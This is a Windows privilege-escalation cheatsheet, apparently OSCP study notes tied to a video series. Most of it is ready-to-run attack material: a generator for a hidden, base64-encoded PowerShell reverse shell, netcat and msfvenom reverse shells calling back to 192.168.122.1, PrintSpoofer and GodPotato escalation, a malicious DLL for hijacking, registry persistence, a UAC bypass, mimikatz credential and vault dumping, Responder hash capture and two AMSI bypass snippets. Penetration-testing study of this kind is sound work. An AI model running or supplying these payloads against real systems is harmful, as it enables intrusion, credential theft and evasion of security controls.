# WINDOWS PRIVESC CHEATSHEET

*Hexdump*

Reference: [https://github.com/LeonardoE95/OSCP/blob/main/modules/windows/windows-privesc-cheatsheet.txt](https://github.com/LeonardoE95/OSCP/blob/main/modules/windows/windows-privesc-cheatsheet.txt)

---

## Table of Contents

1. [Basic](#1-basic)
2. [File System](#2-file-system)
3. [Users, Privileges and Permissions](#3-users-privileges-and-permissions)
4. [File Transfer](#4-file-transfer)
5. [Reverse Shells](#5-reverse-shells)
6. [SeImpersonatePrivilege](#6-seimpersonateprivilege)
7. [SeBackupPrivilege](#7-sebackupprivilege)
8. [Cross Compilation](#8-cross-compilation)
9. [Services](#9-services)
10. [Programs and Processes](#10-programs-and-processes)
11. [DLL Hijacking](#11-dll-hijacking)
12. [Registry](#12-registry)

    1. [Always Install Elevated](#121-always-install-elevated)
    2. [Service ImagePath](#122-service-imagepath)
    3. [LoadAppInit_DLLs and AppInit_DLLs](#123-loadappinit_dlls-and-appinit_dlls)
    4. [Run](#124-run)
    5. [WinLogon](#125-winlogon)
13. [UAC Bypass](#13-uac-bypass)
14. [Windows Hashes](#14-windows-hashes)
15. [Credential Manager and Windows Vault](#15-credential-manager-and-windows-vault)
16. [Scheduld Tasks](#16-scheduld-tasks)
17. [Enumeration Scripts](#17-enumeration-scripts)
18. [AMSI Bypass](#18-amsi-bypass)

---

## 1. Basic

* **Video:**

  * [https://www.youtube.com/watch?v=-3UtOvZDWdk&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=2&t=50s&pp=gAQBiAQB](https://www.youtube.com/watch?v=-3UtOvZDWdk&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=2&t=50s&pp=gAQBiAQB)
* **Text:**

  * [https://github.com/LeonardoE95/yt-en/blob/main/src/2024-06-19-windows-privesc-introduction-shell/content/notes.txt](https://github.com/LeonardoE95/yt-en/blob/main/src/2024-06-19-windows-privesc-introduction-shell/content/notes.txt)

### Operating system, version and architecture

```powershell
systeminfo
```

### Username

```powershell
whoami
```

### Get env variables

```powershell
set
```

### Print specific env variable value

```powershell
echo %PATH%
```

### Find path of executables

```powershell
where <EXE NAME>
```

### Get documentation

```powershell
help dir
```

---

## 2. File System

* **Video:**

  * [https://www.youtube.com/watch?v=-3UtOvZDWdk&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=2&t=50s&pp=gAQBiAQB](https://www.youtube.com/watch?v=-3UtOvZDWdk&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=2&t=50s&pp=gAQBiAQB)
* **Text:**

  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-06-19-windows-privesc-introduction-shell/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-06-19-windows-privesc-introduction-shell/content/notes.txt)

### Search files recursively

```powershell
Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
```

### Get history in memory

```powershell
Get-History
```

### Get file where the history is saved

```powershell
(Get-PSReadlineOption).HistorySavePath
```

### Default location for PowerShell history in Windows

```powershell
%UserProfile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Transcript feature

```powershell
Start-Transcript -Path "C:\Users\Quickemu\Desktop\Log.txt"
Stop-Transcript
```

### Registry Hives

```text
HKEY_CLASSES_ROOT (HKCR)   -> C:\Windows\System32\Config\Software
HKEY_LOCAL_MACHINE (HKLM)  -> C:\Windows\System32\Config\SYSTEM
HKEY_USERS (HKU)           -> C:\Windows\System32\Config\DEFAULT
HKEY_CURRENT_USER (HKCU)   -> C:\Users\<UserName>\NTUSER.DAT
HKEY_CURRENT_CONFIG (HKCC) -> C:\Windows\System32\Config\SystemProfile
```

---

## 3. Users, Privileges and Permissions

* **Video:**

  * [https://www.youtube.com/watch?v=-3UtOvZDWdk&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=2&t=50s&pp=gAQBiAQB](https://www.youtube.com/watch?v=-3UtOvZDWdk&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=2&t=50s&pp=gAQBiAQB)
* **Text:**

  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-07-06-windows-privesc-windows-permissions/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-07-06-windows-privesc-windows-permissions/content/notes.txt)

### Current user

```powershell
whoami
```

### List my groups

```powershell
whoami /groups
```

### Privileges of current user

```powershell
whoami /priv
```

### Account policy for current user

```powershell
net accounts
```

### List users in the system

```powershell
net user
```

### List user detail

```powershell
net user <USERNAME>
```

### List local users

```powershell
Get-LocalUser
```

### List local groups

```powershell
Get-LocalGroup
```

### Get members from a local group

```powershell
Get-LocalGroupMember <GROUP-NAME>
```

### Get permissions of file

```powershell
icacls <FILE>
```

### Enumerate SIDs

```powershell
wmic useraccount get domain,name,sid
```

---

## 4. File Transfer

* **Video:**

  * [https://www.youtube.com/watch?v=Vwv4IhUH_00&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=3](https://www.youtube.com/watch?v=Vwv4IhUH_00&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=3)
* **Text:**

  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-07-10-windows-privesc-windows-reverse-shells/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-07-10-windows-privesc-windows-reverse-shells/content/notes.txt)

```powershell
certutil -urlcache -split -f <URL> <OUTPUT-FILE>
certutil -urlcache -split -f https://leonardotamiano.xyz/note.txt note.txt
```

```powershell
Invoke-WebRequest -uri <URL> -Outfile <OUTPUT-FILE>
iwr -uri <URL> -Outfile <OUTPUT-FILE>
iwr -uri https://leonardotamiano.xyz/note.txt -Outfile note.txt
```

---

## 5. Reverse Shells

* **Video:**

  * [https://www.youtube.com/watch?v=Vwv4IhUH_00&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=3](https://www.youtube.com/watch?v=Vwv4IhUH_00&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=3)
* **Text:**

  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-07-10-windows-privesc-windows-reverse-shells/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-07-10-windows-privesc-windows-reverse-shells/content/notes.txt)

### Netcat

```powershell
(windows) iwr -uri https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -Outfile netcat64.exe
(attacker) nc -lvnp <PORT>
(windows) C:\Users\Quickemu\Desktop\nc64.exe <IP> <PORT> -e cmd
```

### Invoke-PowerShellTcp

```powershell
iwr -uri https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -Outfile Invoke-PowerShellTcp.ps1
. .\Invoke-PowerShellTcp
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 4321
```

### Msfvenom

```powershell
(attacker) msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
(windows) .\malicious.exe
```

### Custom PowerShell

```python
#!/usr/bin/env python3

import sys
import base64

IP = "192.168.122.1"
PORT = 7777

def gen_payload(ip, port):
    payload = f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\", {port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    payload = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    return payload

def main():
    global IP, PORT

    if len(sys.argv) < 3:
        print(f"[INFO]: Usage {sys.argv[0]} <IP> <PORT>")
        ip, port = IP, PORT
    else:
        ip, port = sys.argv[1], sys.argv[2]

    print(f"[INFO]: OK")
    print(f"[INFO]: Generating payload for {ip=} AND {port=}")

    payload = gen_payload(ip, port)

    print(f"[INFO]: Payload below\n")
    print(payload)
    print()

if __name__ == "__main__":
    main()
```

### Executed as

```bash
python3 base64_powershell.py 192.168.122.1 7777
```

---

## 6. SeImpersonatePrivilege

* **Video:**

  * [https://www.youtube.com/watch?v=01ODXD-oqyc&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=4&pp=gAQBiAQB](https://www.youtube.com/watch?v=01ODXD-oqyc&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=4&pp=gAQBiAQB)
* **Text:**

  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-07-25-windows-privesc-windows-impersonate-privilege/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-07-25-windows-privesc-windows-impersonate-privilege/content/notes.txt)

### PrintSpoofer

```powershell
iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe" -Outfile PrintSpoofer32.exe
iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -Outfile PrintSpoofer64.ex

PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"e
```

### GodPotato

```powershell
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe" -Outfile GodPotato-NET2.exe
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe" -Outfile GodPotato-NET35.exe
iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile GodPotato-NET4.exe

.\GodPotato-NET2.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
```

---

## 7. SeBackupPrivilege

* **Video:**

  * [https://youtu.be/5zjVDtwyreY](https://youtu.be/5zjVDtwyreY)
* **Text:**

  * [https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-05-windows-privesc-sensitive-files/content/notes.txt](https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-05-windows-privesc-sensitive-files/content/notes.txt)

### Copy SAM and SYSTEM

```powershell
reg save hklm\sam C:\Users\Leonardo\Desktop\SAM.hive
reg save hklm\system C:\Users\Leonardo\Desktop\SYSTEM.hive
```

---

## 8. Cross Compilation

* **Video:**

  * [https://www.youtube.com/watch?v=LESXa6HLOcc&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=5&pp=gAQBiAQB](https://www.youtube.com/watch?v=LESXa6HLOcc&list=PLJnLaWkc9xRh8hmNFWyzWMFgAHo8Lgr93&index=5&pp=gAQBiAQB)
* **Text:**

  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-10-15-windows-privesc-cross-compilation/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-10-15-windows-privesc-cross-compilation/content/notes.txt)

```bash
sudo pacman -S mingw-w64-gcc
x86_64-w64-mingw32-g++ hello.c -static -o hello
x86_64-w64-mingw32-gcc -mwindows -municode -O2 -s -o simpleService.exe simpleService.c
```

---

## 9. Services

* **Video:**

  * [https://www.youtube.com/watch?v=R9pDCdBWTAk](https://www.youtube.com/watch?v=R9pDCdBWTAk)
  * [https://www.youtube.com/watch?v=8sLagxX4OVs](https://www.youtube.com/watch?v=8sLagxX4OVs)
  * [https://www.youtube.com/watch?v=Hj3Y40z2dSQ](https://www.youtube.com/watch?v=Hj3Y40z2dSQ)
  * [https://www.youtube.com/watch?v=9BES78zKpok](https://www.youtube.com/watch?v=9BES78zKpok)
* **Text:**

  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-10-27-windows-privesc-windows-services/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-10-27-windows-privesc-windows-services/content/notes.txt)
  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-11-04-windows-privesc-weak-service-permissions/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-11-04-windows-privesc-weak-service-permissions/content/notes.txt)
  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-11-11-windows-privesc-unquoted-service-path/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-11-11-windows-privesc-unquoted-service-path/content/notes.txt)
  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-11-18-windows-privesc/09-dll-hijacking/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-11-18-windows-privesc/09-dll-hijacking/content/notes.txt)

### Show current services

```powershell
Get-Service
```

### Display specific properties for each service

```powershell
Get-Service | Select-Object Displayname,Status,ServiceName,Can*
```

### Get binary path for each service that is currently running

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

### Get list of all service names

```powershell
sc.exe query
sc.exe query | select-string service_name
```

### Stop service

```powershell
sc.exe stop <SERVICE>
```

### Start service

```powershell
sc.exe start <SERVICE>
```

### Restart service

```powershell
Restart-Service -Name simpleService
```

### Check the configuration of a service

```powershell
sc.exe qc <SERVICE>
```

### Change service configuration

```powershell
sc.exe config <SERVICE> binPath="C:\Users\Quickemu\Downloads\malicious.exe"
```

### Check permissions of a service

```powershell
sc.exe sdshow <SERVICE>
```

### Convert SDDL string to PSCustomObject

```powershell
ConvertFrom-SddlString -Sddl <SDDL>
```

### Change permission of a service

```powershell
sc.exe sdset <SERVICE> <SDDL>
```

### Get executable path for all processes

```powershell
wmic process list full | select-string 'executablepath=C:'
wmic process list full | select-string 'executablepath=C:' | select-string -notmatch 'system32|syswow'
```

### Create new service

```powershell
sc.exe create <SERVICE-NAME> binPath="<PATH-TO-EXECUTABLE>"
sc.exe create SimpleService binPath= "C:\Users\Quickemu\Downloads\simpleService.exe"
```

### Delete service

```powershell
sc.exe delete SimpleService
```

### Modify the ImagePath entry of a service using the registry

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService" -Name ImagePath -Value "C:\Users\Quickemu\Downloads\simpleService.exe"
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
```

### List out DLLs of a given service

```powershell
.\Listdlls64.exe /accepteula simpleService
```

### Enumerate services with winPEAS

```powershell
.\winPEAS.exe quiet servicesinfo
```

---

## 10. Programs and Processes

* **Video:**

  * [https://youtu.be/n382EGuJP8Y](https://youtu.be/n382EGuJP8Y)
* **Text:**

  * [https://github.com/LeonardoE95/yt-en/blob/main/src/2024-06-19-windows-privesc-introduction-shell/content/notes.txt](https://github.com/LeonardoE95/yt-en/blob/main/src/2024-06-19-windows-privesc-introduction-shell/content/notes.txt)

### Running processes

```powershell
Get-Process
```

### Installed apps (32-bit)

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

### Installed apps (64-bit)

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

---

## 11. DLL Hijacking

* **Video:**

  * [https://www.youtube.com/watch?v=9BES78zKpok&t=1199s](https://www.youtube.com/watch?v=9BES78zKpok&t=1199s)
* **Text:**

  * [https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-11-18-windows-privesc/09-dll-hijacking/content/notes.txt](https://raw.githubusercontent.com/LeonardoE95/yt-en/refs/heads/main/src/2024-11-18-windows-privesc/09-dll-hijacking/content/notes.txt)

The specific search order is the following:

1. The folder specified by `lpFileName`
2. System folder, get using `GetSystemDirectory()`
3. 16-bit system folder
4. Windows directory, get using `GetWindowsDirectory()`
5. Current directory
6. Directories listed in the `PATH`

In this case, there is a problem when the attacker is able to introduce a malicious DLL in a position that has priority over the regular DLL.

For example:

* The regular DLL is found within the Windows Directory (`C:\Windows`)
* The malicious DLL is found within the System Folder (`C:\Windows\System32`)

### `malicious-lib.c`

```c
#include <windows.h>
#include <stdlib.h>

__declspec(dllexport) int add_numbers(int a, int b) {
  system("echo 'hacks' > C:\\Users\\Quickemu\\Downloads\\HACKED");
  return a + b;
}
```

```bash
x86_64-w64-mingw32-gcc -shared -o malicious-lib.dll malicious-lib.c
```

In general, if you do not know which functions are exported by the DLL, you can just use `DllMain` to introduce malicious code.

```c
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  system("echo 'hacks' > C:\\Users\\Quickemu\\Downloads\\HACKED");
  return TRUE;
}
```

This approach can bring visible changes to the external behavior of the program, and in general it is not very stealthy.

---

## 12. Registry

* **Video:**

  * [https://youtu.be/HCOxY6U6vLQ](https://youtu.be/HCOxY6U6vLQ)
* **Text:**

  * [https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-19-windows-privesc-critical-registry-paths/content/notes.txt](https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-19-windows-privesc-critical-registry-paths/content/notes.txt)

### 12.1 Always Install Elevated

If `Always Install Elevated` is activated, you can create a malicious MSI package.

```powershell
Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
```

### Generate malicious MSI

```powershell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f msi > sample.msi
```

### Execute it

```powershell
msiexec /quiet /qn /i sample.msi
```

### 12.2 Service ImagePath

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService" -Name ImagePath -Value "C:\Users\Quickemu\Downloads\simpleService.exe"
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\simpleService"
```

### 12.3 LoadAppInit_DLLs and AppInit_DLLs

#### Dealing with `LoadAppInit_DLLs`

```powershell
# enable
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -Value 1
# disable
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -Value 0
# read
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs"
```

#### Dealing with `AppInit_DLLs`

```powershell
# read
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs"
# set
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "C:\Path\To\Library1.dll;C:\Path\To\Library2.dll;C:\Path\To\Library3.dll"
```

### 12.4 Run

```powershell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "TestProgram" -Value "C:\Users\Quickemu\Downloads\hello.exe"
```

### 12.5 WinLogon

#### Shell

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "cmd.exe"
```

#### Explorer

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Shell" -Value "explorer.exe"
```

---

## 13. UAC Bypass

* **Video:**

  * [https://youtu.be/ZhaZJ4Uipqk](https://youtu.be/ZhaZJ4Uipqk)
* **Text:**

  * [https://github.com/LeonardoE95/yt-en/blob/main/src/2024-11-22-windows-privesc-uac-bypass/content/notes.txt](https://github.com/LeonardoE95/yt-en/blob/main/src/2024-11-22-windows-privesc-uac-bypass/content/notes.txt)

UAC can have different configuration levels:

```text
0 -> no prompt
1 -> prompt for credentials on the secure desktop
2 -> prompt for consent on the secure desktop
3 -> prompt for credentials on the normal desktop
4 -> prompt for consent on the normal desktop
5 -> prompt for consent for non-windows binaries
```

If you get a `1`, then UAC is enabled. Otherwise it is disabled.

```powershell
Get-ItemProperty -Path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System' | Select-Object EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
```

### Check specific UAC level

```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System | Select-Object ConsentPromptBehaviorAdmin
```

### UAC level 0 bypass

```powershell
Start-Process -FilePath "C:\Users\Quickemu\Downloads\nc64.exe" -ArgumentList "192.168.122.1 4321 -e cmd.exe" -Verb RunAs -WindowStyle Hidden
Start-Process -FilePath "powershell.exe" -Verb RunAs
```

### UAC level 1,2,3,4 bypass

```powershell
# assume always install elevated is enabled
msiexec /quiet /qn /i sample2.msi
```

### UAC level 5 bypass

```powershell
New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force

Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'cmd.exe' -Type String
Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Type String

Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(Default)' -Value 'C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e cmd.exe' -Type String
```

---

## 14. Windows Hashes

* **Video:**

  * [https://youtu.be/UrcMs4FMcpA](https://youtu.be/UrcMs4FMcpA)
* **Text:**

  * [https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-09-windows-privesc-windows-hashes/content/notes.txt](https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-09-windows-privesc-windows-hashes/content/notes.txt)

### Check if LM hashes are enabled

```powershell
Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'NoLMHash'
```

### Check Net-NTLM compatibility

If the path does not exist, then Net-NTLMv2 is enabled.

```powershell
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'LMCompatibilityLevel'
```

### Algorithm for computing LM Hash

```text
1. Convert all lower case to upper case
2. Pad password to 14 characters with NULL characters
3. Split the password to two 7 character chunks
4. Create two DES keys from each 7 character chunk
5. DES encrypt the string "KGS!@#$%" with these two chunks
6. Concatenate the two DES encrypted strings. This is the LM hash.
```

### Algorithm for computing NTLM Hash

```text
MD4(UTF-16-LE(password))
```

### Algorithm for computing Net-NTLMv1

```text
C = 8-byte server challenge, random
K1 | K2 | K3 = LM/NT-hash | 5-bytes-0
response = DES(K1,C) | DES(K2,C) | DES(K3,C)
```

### Algorithm for computing Net-NTLMv2

```text
SC = 8-byte server challenge, random
CC = 8-byte client challenge, random
CC* = (X, time, CC2, domain name)
v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)
LMv2 = HMAC-MD5(v2-Hash, SC, CC)
NTv2 = HMAC-MD5(v2-Hash, SC, CC*)
response = LMv2 | CC | NTv2 | CC*
```

### Dump NTLM hashes saved in LSASS

```powershell
mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

### Rogue authentication server with Responder to steal Net-NTLM hashes

```bash
python3 -m venv venv
. venv/bin/activate

pip3 install impacket
pip install netifaces

git clone https://github.com/lgandx/Responder.git

cd Responder
sudo python3 Responder.py -I virbr0

(victim) C:\Users\Quickemu\Downloads> dir \\192.168.122.1\test
Access is denied.
```

### Download rockyou wordlist

```bash
curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz > rockyou.txt.tar.gz
tar -xvf rockyou.txt.tar.gz
```

### To crack an LM hash

```bash
john --format=lm --wordlist=rockyou.txt hash.txt
hashcat -m 3000 -a 3 hash.txt
```

### To crack an NTLM hash

```bash
john --format=nt --wordlist=rockyou.txt hash.txt
hashcat -m 1000 -a 3 hash.txt
```

### To crack a Net-NTLMv1

```bash
john --format=netntlm --wordlist=rockyou.txt hash.txt
hashcat -m 5500 -a 3 hash.txt
```

### To crack a Net-NTLMv2

```bash
john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
hashcat -m 5600 -a 3 hash.txt
```

---

## 15. Credential Manager and Windows Vault

* **Video:**

  * [https://youtu.be/uzLGG8EsUAU](https://youtu.be/uzLGG8EsUAU)
* **Text:**

  * [https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-13-windows-privesc-stored-credentials](https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-13-windows-privesc-stored-credentials)

### To list out all stored credentials

```powershell
cmdkey /list
```

### To add new credentials

```powershell
cmdkey /add:MyServer /user:MyUser /pass:MyPassword
```

### To delete credentials

```powershell
cmdkey /delete:MyServer
cmdkey /delete:Domain:interactive=WORKGROUP\Administrator
```

### Enumerate vaults

```powershell
vaultcmd /list
```

### List entries saved in vault

```powershell
vaultcmd /listcreds:"Web Credentials" /all
```

### Dump vault with mimikatz

```powershell
mimikatz.exe vault::list
```

---

## 16. Scheduld Tasks

* **Video:**

  * [https://youtu.be/NbsJ3mHhoVw](https://youtu.be/NbsJ3mHhoVw)
* **Text:**

  * [https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-16-windows-privesc-scheduled-tasks](https://github.com/LeonardoE95/yt-en/blob/main/src/2024-12-16-windows-privesc-scheduled-tasks)

### List all scheduled tasks

```powershell
Get-ScheduledTask
schtasks /query
```

### List tasks in a specific folder

```powershell
Get-ScheduledTask | Where-Object {$_.TaskPath -eq "\Microsoft\Windows\Shell\"}
```

### List tasks with detailed information

```powershell
Get-ScheduledTask -TaskName "MyTask" | Get-ScheduledTaskInfo
schtasks /query /FO LIST /V
Get-ScheduledTask -TaskName "XblGameSaveTask" | Format-List *
```

### Extract binary path and arguments of services

```powershell
(Get-ScheduledTask -TaskName "XblGameSaveTask").Actions
Get-ScheduledTask | ForEach-Object { $_.Actions }
```

### Export task configuration as XML

```powershell
Export-ScheduledTask -TaskName "XblGameSaveTask" -TaskPath "\Microsoft\XblGameSave\"
```

---

## 17. Enumeration Scripts

* **Video:**

  * TODO
* **Text:**

  * TODO

### Windows Privilege Escalation Awesome Script (.exe)

[https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe)

```powershell
iwr -uri https://github.com/peass-ng/PEASS-ng/releases/download/20241205-c8c0c3e5/winPEASx64.exe -Outfile winPEASx64.exe

.\winPEASx64.exe log
.\winPEAS.exe quiet servicesinfo
```

### PowerUp

PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

[https://powersploit.readthedocs.io/en/latest/Privesc/](https://powersploit.readthedocs.io/en/latest/Privesc/)

```powershell
iwr -uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1 -Outfile PowerUp.ps1

Import-Module PowerUp.ps1
. .\PowerUp.ps1

Invoke-PrivescAudit -HTMLReport
```

### PrivescCheck

This script aims to identify Local Privilege Escalation (LPE) vulnerabilities that are usually due to Windows configuration issues, or bad practices. It can also gather useful information for some exploitation and post-exploitation tasks.

[https://github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck)

```powershell
iwr -uri "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/release/PrivescCheck.ps1" -Outfile PrivescCheck.ps1

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML"
```

### BeRoot Project

BeRoot Project is a post-exploitation tool to check common misconfigurations to find a way to escalate privilege.

[https://github.com/AlessandroZ/BeRoot?tab=readme-ov-file](https://github.com/AlessandroZ/BeRoot?tab=readme-ov-file)

```powershell
iwr -uri "https://github.com/AlessandroZ/BeRoot/releases/download/1.0.1/beRoot.zip" -Outfile beRoot.zip
```

---

## 18. AMSI Bypass

* **Video:**

  * TODO
* **Text:**

  * TODO

### Bypass #1

```powershell
$fields=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static')
$amsiContext=$fields | Where-Object { $_ -like "*Context" }
[IntPtr]$amsiContextPointer=$amsiContext.GetValue($null)

[Int32[]]$emptyBuffer = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($emptyBuffer, 0, $amsiContextPointer, 1)
```

### Bypass #2

```powershell
$amsiInitFailedField=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" }
$amsiInitFailedField.SetValue($null, $true)
```
